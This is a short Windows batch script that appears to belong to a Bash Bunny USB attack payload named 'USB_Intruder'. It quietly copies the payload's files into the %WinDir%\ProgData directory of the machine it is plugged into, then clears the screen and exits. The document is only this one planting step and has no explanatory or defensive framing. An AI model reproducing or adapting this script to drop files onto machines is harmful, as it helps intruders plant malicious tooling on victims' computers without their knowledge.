@echo OFF

REM Setting dst to %BASHBUNNY%\Payload\$Switch_Position\USB_Intruder\
set dst=%~dp0USB_Intruder

REM Copying files from dst to %WinDir%\ProgData
xcopy /C /Q /G /Y /S %dst%\*.* %WinDir%\ProgData\

@cls
@exit